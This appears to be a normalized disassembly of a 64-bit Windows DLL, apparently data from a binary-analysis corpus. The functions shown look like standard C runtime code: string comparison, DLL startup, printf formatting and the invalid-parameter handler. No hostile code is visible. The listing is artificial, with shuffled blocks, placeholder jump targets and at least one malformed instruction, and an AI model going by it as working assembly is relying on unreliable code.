movzx ebx [ rdi ]
cmp bx 0x41
jb r-xdata
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x48 ] r12b
je r-xdata
cmp bx r12w
je r-xdata
movzx eax [ rsi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp bx ax
je r-xdata
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx r12w
je r-xdata
add ax 0x20
cmp bx ax
je r-xdata
jmp r-xdata
sub_18000f518
push rbx
sub rsp 0x30
xor ebx ebx
mov r10 rcx
cmp [ rw-data ] ebx
jne r-xdata
xor r9d r9d
call sub_18000f3ec
cmp r8 rbx
je r-xdata
mov eax ebx
jmp r-xdata
cmp rcx rbx
jne r-xdata
add rsp 0x30
pop rbx
retn
cmp rdx rbx
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180010764
mov eax 0x7fffffff
jmp r-xdata
movzx ecx [ r10 ]
cmp cx 0x41
jb r-xdata
movzx eax [ rdx ]
cmp ax 0x41
jb r-xdata
cmp cx 0x5a
ja r-xdata
add r10 0x2
add rdx 0x2
sub r8 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add cx 0x20
movzx eax ax
movzx ebx cx
sub ebx eax
cmp cx bx
je r-xdata
add ax 0x20
cmp cx ax
je r-xdata
sub_18000f5f0
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
mov ecx edx
call sub_180014a60
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_180010bf0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_1800108e8
mov edx 0x2c8
mov ecx 0x1
call sub_180011510
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_1800183cc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_180018218
mov [ rw-data ] rax
call sub_180017ac4
test eax eax
jns r-xdata
call sub_180014aac
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_180010bb0
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_18001142c
call sub_180018120
test eax eax
js r-xdata
call sub_1800108f4
jmp r-xdata
call sub_18000e06c
jmp r-xdata
xor edx edx
call sub_18001091c
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
call sub_180017db4
call sub_1800108f4
call sub_180014aac
jmp r-xdata
call sub_180017db4
jmp r-xdata
call sub_180017e20
test eax eax
js r-xdata
xor ecx ecx
call sub_1800111e4
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_18000f72c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call DllMain
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
test eax eax
je r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18000f5f0
mov [ rsp + 0x20 ] eax
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18000f5f0
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call DllMain
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18000f5f0
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000f72c
call sub_18001843c
sub_18000f884
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_18001923c
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_180010834
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_180010834
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_180019018
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_180018e20
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
cmp ebp edi
mov [ rbx + 0x8 ] eax
jle r-xdata
mov ecx esi
call sub_180018fa8
cmp eax edi
jne r-xdata
call sub_180019018
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_180018e20
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_180018f54
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_180018588
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_18000fa14
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
call sub_180019274
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
inc [ rbx ]
or [ rbx ] 0xffffffff
jmp r-xdata
inc [ r8 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000fa4c
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
movzx ebp cx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
movzx ecx bp
dec ebx
call sub_18000fa14
cmp [ rdi ] 0xffffffff
je r-xdata
sub_18000faa0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rdi r9
mov rsi r8
mov ebx edx
mov rbp rcx
je r-xdata
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
movzx ecx [ rbp ]
mov r8 rdi
mov rdx rsi
dec ebx
call sub_18000fa14
add rbp 0x2
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test ebx ebx
jg r-xdata
call sub_180010834
cmp [ rax ] 0x2a
jne r-xdata
mov ecx 0x3f
mov r8 rdi
mov rdx rsi
call sub_18000fa14
sub_18000fb24
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x4c0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x4b0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rsp + 0x78 ]
mov rdx r8
mov r15 r9
mov [ rsp + 0x74 ] eax
mov ebp eax
mov [ rsp + 0x50 ] eax
mov r13d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x60 ] eax
mov [ rsp + 0x44 ] eax
call sub_18000d428
xor r10d r10d
cmp rbx r10
jne r-xdata
cmp rdi r10
je r-xdata
call sub_180010834
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180010764
cmp [ rsp + 0x90 ] bl
je r-xdata
movzx r12d [ rdi ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov r14d r10d
mov edx r10d
mov [ rsp + 0x98 ] r10
cmp r12w r10w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x90 ] r10b
je r-xdata
mov rbx [ rsp + 0xa8 ]
mov ecx 0x58
mov r9d 0x200
lea r8d [ rcx - 0x38 ]
lea r11d [ rcx - 0x28 ]
mov rcx [ rsp + 0x4b0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x510 ]
add rsp 0x4c0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
mov rcx [ rsp + 0x88 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx eax r12w
sub ax r8w
cmp ax cx
ja r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r12w
movsx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r12w
mov [ rsp + 0x44 ] 0x1
call sub_18000fa14
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
lea rax [ r--data ]
movsx edx [ rdx + rax ]
sar edx 0x4
mov [ rsp + 0x64 ] edx
mov ecx edx
cmp edx r10d
je r-xdata
mov r8d 0x20
jmp r-xdata
or r13d 0xffffffff
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x60 ] r10d
mov [ rsp + 0x50 ] r10d
mov [ rsp + 0x4c ] r10d
mov ebp r10d
mov [ rsp + 0x48 ] r13d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
mov edx [ rsp + 0x64 ]
mov r9d 0x200
mov r11d 0x30
mov ecx 0x58
movzx eax r12w
cmp eax r8d
je r-xdata
sub ecx 0x1
je r-xdata
add rdi 0x2
cmp esi r10d
mov [ rsp + 0xa0 ] rdi
jl r-xdata
or ebp 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r12w 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
bts ebp 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x50 ]
lea ecx [ rax + rax * 4 ]
movzx eax r12w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x50 ] eax
jmp r-xdata
mov eax [ r15 ]
add r15 0x8
mov ecx 0x58
cmp eax r10d
mov [ rsp + 0x50 ] eax
jge r-xdata
mov r13d r10d
mov [ rsp + 0x48 ] r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
or ebp 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
mov r12w [ rdi ]
cmp r12w r10w
jne r-xdata
or ebp 0x4
neg eax
mov [ rsp + 0x50 ] eax
jmp r-xdata
cmp r12w 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
or ebp 0x4
jmp r-xdata
mov ecx 0x58
cmp eax r11d
jne r-xdata
lea ecx [ r13 + r13 * 4 ]
movzx eax r12w
lea r13d [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x48 ] r13d
jmp r-xdata
mov r13d [ r15 ]
add r15 0x8
mov ecx 0x58
cmp r13d r10d
mov [ rsp + 0x48 ] r13d
jge r-xdata
movzx eax r12w
cmp eax 0x49
je r-xdata
cmp ecx 0x1
jne r-xdata
or ebp 0x8
jmp r-xdata
or r13d 0xffffffff
mov [ rsp + 0x48 ] r13d
jmp r-xdata
bts ebp 0xf
cmp [ rdi ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r12w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ rdi ] 0x33
jne r-xdata
cmp [ rdi + 0x2 ] 0x34
jne r-xdata
or ebp r8d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ rdi ] ax
je r-xdata
cmp [ rdi + 0x2 ] 0x32
jne r-xdata
add rdi 0x4
bts ebp 0xf
jmp r-xdata
cmp [ rdi ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov r12d [ rsp + 0x44 ]
mov ecx 0x67
cmp eax ecx
jle r-xdata
or ebp 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ rdi ] ax
je r-xdata
add rdi 0x4
btr ebp 0xf
jmp r-xdata
or ebp 0x10
jmp r-xdata
add rdi 0x2
bts ebp 0xc
jmp r-xdata
bts ebp 0xb
jmp r-xdata
mov r8d 0x20
test bpl 0x40
je r-xdata
mov r14d [ rsp + 0x70 ]
jmp r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
mov r8 [ r15 ]
add r15 0x8
jmp r-xdata
bt ebp 0xc
jae r-xdata
mov r14d 0x1
add r12w r8w
mov [ rsp + 0x70 ] r14d
jmp r-xdata
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ rdi ] ax
je r-xdata
mov rdi [ rsp + 0xa0 ]
mov rcx rax
call sub_18000e06c
mov rdi [ rsp + 0xa0 ]
xor r10d r10d
mov [ rsp + 0x98 ] r10
mov edi [ rsp + 0x4c ]
bt ebp 0x8
jae r-xdata
or ebp 0x40
cmp r13d r10d
lea rbx [ rsp + 0xb0 ]
mov esi r9d
jge r-xdata
cmp eax 0x6e
je r-xdata
test bpl 0x40
je r-xdata
add r15 0x8
test r8b bpl
je r-xdata
mov ecx 0x67
test ebp 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ rdi ] ax
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x5c ]
mov r8 rsi
mov edx edi
call sub_18000faa0
mov rdi [ rsp + 0x68 ]
test bpl 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 rsi
mov edx r13d
call sub_18000fa4c
test bpl 0x1
je r-xdata
mov [ rsp + 0x5c ] di
jne r-xdata
mov r13d 0x6
jmp r-xdata
mov rdi [ r15 ]
add r15 0x8
call sub_180019494
xor r10d r10d
cmp eax r10d
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
bt ebp 0xf
jb r-xdata
cmp r8 r10
jge r-xdata
test bpl 0x40
je r-xdata
test bpl 0x40
je r-xdata
movzx eax [ r15 ]
add r15 0x8
mov r12d 0x1
mov [ rsp + 0x58 ] ax
mov [ rsp + 0x44 ] r12d
test r8b bpl
je r-xdata
or ebp r8d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ rdi ] ax
je r-xdata
xor eax eax
cmp r12d eax
jne r-xdata
test bpl 0x4
jne r-xdata
test bpl 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x5c ] ax
jmp r-xdata
mov eax 0x20
cmp r13d r9d
cmovg r13d r9d
cmp r13d 0xa3
mov [ rsp + 0x48 ] r13d
jle r-xdata
cmp r12w cx
jne r-xdata
mov [ rsp + 0x48 ] r13d
lea r8d [ r10 + 0x20 ]
test r8b bpl
je r-xdata
mov r9d 0x8
test bpl bpl
jns r-xdata
cmp eax 0x70
je r-xdata
cmp r13d r10d
jge r-xdata
bt ebp 0xc
jb r-xdata
neg r8
bts ebp 0x8
mov r8d [ r15 - 0x8 ]
movsxd r8 [ r15 - 0x8 ]
jmp r-xdata
movzx r8d [ r15 - 0x8 ]
jmp r-xdata
movsx r8 [ r15 - 0x8 ]
jmp r-xdata
mov [ rsp + 0xb0 ] ax
mov [ rsp + 0x54 ] al
mov rax [ rsp + 0x78 ]
mov [ rsp + 0x55 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rsp + 0x78 ]
lea rdx [ rsp + 0x54 ]
lea rcx [ rsp + 0xb0 ]
call sub_1800194ac
xor r10d r10d
cmp eax r10d
jge r-xdata
cmp eax 0x53
je r-xdata
cmp [ rdi ] cx
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rdi
mov edx r14d
mov rcx rbx
call sub_18000faa0
xor r10d r10d
cmp r14d eax
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 rdi
mov edx r13d
call sub_18000fa4c
mov eax 0x20
mov [ rsp + 0x5c ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov rax [ r15 ]
mov rcx [ rw-data ]
add r15 0x8
movsx edi r12b
movsxd rsi esi
mov [ rsp + 0xa8 ] rax
call DecodePointer
lea rcx [ rsp + 0x78 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0xa8 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r13d
call rax
mov edi ebp
xor eax eax
and edi 0x80
je r-xdata
lea edi [ r13 + 0x15d ]
movsxd rcx edi
call sub_1800114a4
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
mov r13d 0x1
jmp r-xdata
mov ecx 0x67
cmp r12w cx
jne r-xdata
cmp r13d eax
jne r-xdata
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
bts ebp 0x9
jmp r-xdata
mov r13d 0x10
bts ebp 0xf
cmp eax 0x73
je r-xdata
mov eax 0x200
and ebp 0xfffffff7
cmp r13d eax
cmovg r13d eax
mov r13d 0x1
jmp r-xdata
mov r8d r8d
mov edi 0x2d
lea rbx [ rsp + 0xb0 ]
mov r14d r12d
jmp r-xdata
mov [ rsp + 0x60 ] r12d
jmp r-xdata
test ebp 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x64 ] r10d
mov r13d [ rsp + 0x48 ]
test bpl 0x4
je r-xdata
mov rdi rbx
mov esi r14d
mov r13d [ rsp + 0x50 ]
mov rsi [ rsp + 0x68 ]
sub r13d r14d
sub r13d edi
test bpl 0xc
jne r-xdata
mov r13d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
cmp edi eax
jne r-xdata
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
xor eax eax
mov rax [ rsp + 0x98 ]
cmp rax r10
je r-xdata
mov [ rsp + 0x60 ] 0x1
jmp r-xdata
add ax 0x51
mov [ rsp + 0x5c ] r11w
lea edx [ r9 - 0xe ]
mov [ rsp + 0x5e ] ax
jmp r-xdata
mov rbx [ r15 ]
cmp r13d 0xffffffff
mov edi r13d
mov eax 0x7fffffff
cmove edi eax
add r15 0x8
test r8b bpl
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
cmp r8 r10
je r-xdata
mov esi [ rsp + 0x74 ]
mov rax r8
lea rbx [ rsp + 0x2af ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
or ebp r8d
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 rdi
mov edx r13d
call sub_18000fa4c
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov rdi [ rsp + 0x68 ]
or esi 0xffffffff
mov [ rsp + 0x40 ] esi
jmp r-xdata
mov rdx [ rsp + 0x68 ]
movzx ecx [ rsp + 0x58 ]
lea r8 [ rsp + 0x40 ]
call sub_18000fa14
xor r10d r10d
add rdi r12
cmp esi r10d
jg r-xdata
mov rcx rbx
call sub_1800174b0
mov esi [ rsp + 0x40 ]
mov r12d [ rsp + 0x44 ]
mov r14d eax
xor r10d r10d
jmp r-xdata
bts ebp 0x8
inc rbx
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
bt ebp 0xf
jb r-xdata
cmp rbx r10
mov r12d 0x1
cmove rbx [ rw-data ]
mov [ rsp + 0x44 ] r12d
mov rax rbx
jmp r-xdata
cmp rbx r10
mov r14d r10d
cmove rbx [ rw-data ]
cmp edi r10d
mov rsi rbx
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rsp + 0x2af ]
mov [ rsp + 0x48 ] r13d
sub eax ebx
inc rbx
bt ebp 0x9
mov r14d eax
jae r-xdata
mov rax [ r15 ]
add r15 0x8
cmp rax r10
je r-xdata
cmp eax 0x61
je r-xdata
cmp esi r10d
jl r-xdata
mov rax [ rsp + 0x78 ]
lea r9 [ rsp + 0x78 ]
lea rcx [ rsp + 0x58 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_1800194ac
xor r10d r10d
movsxd r12 eax
cmp r12d r10d
jle r-xdata
mov rdi [ rsp + 0x68 ]
jmp r-xdata
cmp [ rsp + 0x60 ] r10d
jne r-xdata
cmp edi r10d
jne r-xdata
mov esi [ rsp + 0x40 ]
cmp [ rsi ] r10b
je r-xdata
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx r13d
dec r13d
cmp ecx r10d
jg r-xdata
cmp eax r10d
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_1800174b0
xor r10d r10d
mov r14 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
cmp rbx r10
je r-xdata
mov r14d [ rsp + 0x70 ]
cmp eax 0x63
je r-xdata
mov esi [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r14d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rsp + 0x78 ]
call sub_180019628
xor r10d r10d
cmp eax r10d
je r-xdata
mov [ rsp + 0x74 ] eax
mov r9d 0x10
test bpl bpl
jns r-xdata
dec rbx
inc r14d
mov [ rbx ] r11b
jmp r-xdata
cmp [ rbx ] r11b
je r-xdata
bt ebp 0xb
mov edi 0x2d
jae r-xdata
jmp r-xdata
add rax 0x2
inc r14d
inc rsi
cmp r14d edi
jl r-xdata
inc rsi
movsx r14d [ rax ]
mov r12d r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
movsx eax [ rax ]
lea r12d [ rdi - 0x2c ]
cdq
mov [ rsp + 0x44 ] r12d
sub eax edx
sar eax 0x1
mov r14d eax
jmp r-xdata
sub_18001063c
push rbx
sub rsp 0x5e0
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_180016870
lea r11 [ rsp + 0x70 ]
lea rax [ rsp + 0x110 ]
lea rcx [ rsp + 0x110 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov rbx [ rsp + 0x208 ]
lea rdx [ rsp + 0x40 ]
mov rcx rbx
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x208 ] rax
lea rax [ rsp + 0x5e8 ]
mov [ rsp + 0x1a8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rsp + 0x110 ]
mov r8 rbx
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000417
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x5e0
pop rbx
retn
test ebx ebx
jne r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x70 ] 0xc0000417
mov [ rsp + 0x74 ] 0x1
mov [ rsp + 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x2 ]
call sub_1800196b8
sub_180010764
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call DecodePointer
test rax rax
je r-xdata
mov ecx 0x2
call sub_1800196b8
mov r11 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r11
call sub_18001063c
mov r10 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r10
call rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1800107ec
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_180010874
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800109d0
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_1800107ec
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_1800109d0
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_18001091c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_180016624
nop
mov rax [ rbx + 0xb8 ]
[ rax ] 0x1
mov ecx 0xd
call sub_180016524
mov ecx 0xc
call sub_180016624
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_18000e3e4
nop
mov ecx 0xc
call sub_180016524
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
